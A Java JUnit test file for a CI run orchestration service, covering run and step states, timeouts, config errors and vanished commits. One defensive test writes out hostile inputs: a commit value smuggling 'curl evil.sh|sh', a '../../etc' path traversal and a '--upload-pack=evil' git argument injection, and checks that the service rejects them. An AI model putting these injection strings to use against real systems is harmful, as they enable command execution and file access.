package eu.wohlben.qits.ci.control;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.ci.control.CiConfigSource.ConfigLookup;
import eu.wohlben.qits.ci.control.CiStepRunner.StepResult;
import eu.wohlben.qits.ci.entity.CiRun;
import eu.wohlben.qits.ci.entity.CiRunStatus;
import eu.wohlben.qits.ci.entity.CiStep;
import eu.wohlben.qits.ci.entity.CiStepStatus;
import eu.wohlben.qits.ci.error.BadRequestException;
import io.quarkus.test.junit.QuarkusTest;
import jakarta.inject.Inject;
import java.util.List;
import java.util.UUID;
import org.junit.jupiter.api.Test;

/**
 * Drives the orchestrator synchronously (package-private {@code execute}) against the fake config
 * source and step runner — the whole run/step state machine without docker or a git host.
 */
@QuarkusTest
public class CiRunServiceTest extends CiTestSupport {

  private static final String CONFIG_TWO_STEPS =
      """
      steps:
        - image: alpine:3
          script: echo one
        - image: alpine:3
          script: echo two
      """;

  @Inject CiRunService service;

  private String repoId;
  private String sha;

  private void seedConfig(String content) {
    repoId = UUID.randomUUID().toString();
    sha = UUID.randomUUID().toString().replace("-", "");
    fakeConfig.put(repoId, sha, ConfigLookup.found(content));
  }

  private CiRun soleRun() {
    List<CiRun> all = service.runsFor(repoId);
    assertEquals(1, all.size(), "expected exactly one recorded run");
    return all.get(0);
  }

  @Test
  public void greenRunRecordsSuccessWithStepOutputs() {
    seedConfig(CONFIG_TWO_STEPS);
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status);
    assertEquals("main", run.branch);
    assertEquals(sha, run.commitSha);
    assertNotNull(run.finishedAt);

    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(2, recorded.size());
    for (CiStep step : recorded) {
      assertEquals(CiStepStatus.SUCCESS, step.status);
      assertEquals(0, step.exitCode);
      assertEquals("ok step " + step.stepIndex, step.output);
      assertEquals("alpine:3", step.image);
    }
    // The runner saw the right specs, in order.
    assertEquals(2, fakeRunner.executed().size());
    assertEquals("echo one", fakeRunner.executed().get(0).script());
    assertEquals(sha, fakeRunner.executed().get(0).sha());
  }

  @Test
  public void failingStepFailsTheRunAndSkipsTheRest() {
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.script(0, new StepResult(7, "boom", false, true));
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    assertEquals(7, recorded.get(0).exitCode);
    assertEquals("boom", recorded.get(0).output);
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
    assertNull(recorded.get(1).exitCode);
    // Only the failing step actually executed.
    assertEquals(1, fakeRunner.executed().size());
  }

  @Test
  public void timedOutStepFailsTheRunWithAMarkedOutput() {
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.script(0, new StepResult(-1, "partial output", true, true));
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    CiStep first = service.stepsFor(run.id).get(0);
    assertEquals(CiStepStatus.FAILED, first.status);
    assertTrue(first.output.contains("[step timed out]"), first.output);
  }

  @Test
  public void brokenConfigRecordsAConfigErrorRunWithNoSteps() {
    seedConfig("steps:\n  - image: alpine:3\n"); // missing script
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.CONFIG_ERROR, run.status);
    assertNotNull(run.finishedAt);
    assertEquals(0, service.stepsFor(run.id).size());
    assertEquals(0, fakeRunner.executed().size());
  }

  @Test
  public void absentConfigRecordsNothing() {
    repoId = UUID.randomUUID().toString();
    service.execute(repoId, "main", "0123456789abcdef");
    assertEquals(0, service.runsFor(repoId).size());
  }

  @Test
  public void unreachableGitHostRecordsNothing() {
    repoId = UUID.randomUUID().toString();
    sha = "0123456789abcdef";
    fakeConfig.put(repoId, sha, ConfigLookup.unreachable());
    service.execute(repoId, "main", sha);
    assertEquals(0, service.runsFor(repoId).size());
  }

  @Test
  public void presentConfigWithNoStepsRecordsATriviallyGreenRun() {
    // Opted in (file present) but nothing to verify — visible, unlike an absent file.
    seedConfig("# no steps yet\n");
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status);
    assertEquals(0, service.stepsFor(run.id).size());
  }

  @Test
  public void commitGoneBeforeTheRunRecordsNothing() {
    // Force-pushed away between push and run: nothing is recorded, so a commit whose build was
    // never broken is never shown red.
    repoId = UUID.randomUUID().toString();
    sha = "0123456789abcdef";
    fakeConfig.put(repoId, sha, ConfigLookup.gone());
    service.execute(repoId, "main", sha);
    assertEquals(0, service.runsFor(repoId).size());
  }

  @Test
  public void unusableConfigRecordsAConfigErrorRun() {
    repoId = UUID.randomUUID().toString();
    sha = "0123456789abcdef";
    fakeConfig.put(repoId, sha, ConfigLookup.invalid("too large"));
    service.execute(repoId, "main", sha);
    assertEquals(CiRunStatus.CONFIG_ERROR, soleRun().status);
  }

  @Test
  public void workspaceSetupFailureDiscardsTheRunWhenTheCommitIsGone() {
    // The prelude failed AND the commit has since vanished (force-pushed away mid-queue), so the
    // exit code belongs to git, not the pipeline: the run describes a push that no longer exists.
    seedConfig(CONFIG_TWO_STEPS);
    fakeConfig.put(repoId, sha, ConfigLookup.gone()); // what the post-failure re-read sees
    fakeRunner.script(
        0, new StepResult(128, "fatal: reference is not a tree: deadbeef", false, false));
    service.execute(repoId, "main", sha);
    assertEquals(0, service.runsFor(repoId).size());
  }

  @Test
  public void workspaceSetupFailureOnAReachableCommitStaysOnTheRecord() {
    // Same symptom, different cause: the commit is fine, so the prelude failed for a reason the
    // user
    // must see — typically an image without git/bash. Discarding here would hide a broken pipeline.
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.script(0, new StepResult(127, "bash: git: command not found", false, false));
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    List<CiStep> recorded = service.stepsFor(run.id);
    assertEquals(CiStepStatus.FAILED, recorded.get(0).status);
    assertEquals(127, recorded.get(0).exitCode);
    assertTrue(recorded.get(0).output.contains("git: command not found"));
    assertEquals(CiStepStatus.SKIPPED, recorded.get(1).status);
  }

  @Test
  public void timedOutStepIsRecordedEvenWithoutAReadyWorkspace() {
    // A timeout is a real pipeline outcome, not a vanished commit — it must still be recorded.
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.script(0, new StepResult(-1, "hung", true, false));
    service.execute(repoId, "main", sha);
    assertEquals(CiRunStatus.FAILED, soleRun().status);
  }

  @Test
  public void aFailureMidRunLeavesNoStepStuckRunningOrPending() {
    // A crash after a step went RUNNING must not persist a finished run whose step still claims to
    // be executing. The fake throws instead of returning, standing in for a transient DB error.
    seedConfig(CONFIG_TWO_STEPS);
    fakeRunner.throwOn(0, new IllegalStateException("transient failure"));
    service.execute(repoId, "main", sha);

    CiRun run = soleRun();
    assertEquals(CiRunStatus.FAILED, run.status);
    assertNotNull(run.finishedAt);
    for (CiStep step : service.stepsFor(run.id)) {
      assertTrue(
          step.status == CiStepStatus.FAILED || step.status == CiStepStatus.SKIPPED,
          "step " + step.stepIndex + " left in " + step.status);
    }
  }

  @Test
  public void hostileIdentifiersAreRejectedAtTheEntryPoint() {
    // The intake is reachable without a session, so the ids it supplies are validated before they
    // reach a filesystem path or a git/bash argv.
    String good = UUID.randomUUID().toString();
    assertThrows(
        BadRequestException.class,
        () -> service.onPostReceive(good, "main", null, "HEAD\nset +e\ncurl evil.sh|sh #"));
    assertThrows(
        BadRequestException.class,
        () -> service.onPostReceive("../../etc", "main", null, "cafebabe0000000"));
    assertThrows(
        BadRequestException.class,
        () -> service.onPostReceive(good, "--upload-pack=evil", null, "cafebabe0000000"));
  }

  @Test
  public void onPostReceiveExecutesAsynchronously() throws Exception {
    seedConfig(CONFIG_TWO_STEPS);
    service.onPostReceive(repoId, "main", "0".repeat(40), sha);
    service.awaitIdle();
    assertEquals(CiRunStatus.SUCCESS, soleRun().status);
  }

  @Test
  public void tailKeepsTheEndAndMarksTheCut() {
    assertNull(CiRunService.tail(null, 10));
    assertEquals("short", CiRunService.tail("short", 10));
    assertEquals("exactlyten", CiRunService.tail("exactlyten", 10));
    String cut = CiRunService.tail("0123456789abcdef", 10);
    assertEquals(CiRunService.TRUNCATION_MARKER + "6789abcdef", cut);
  }
}
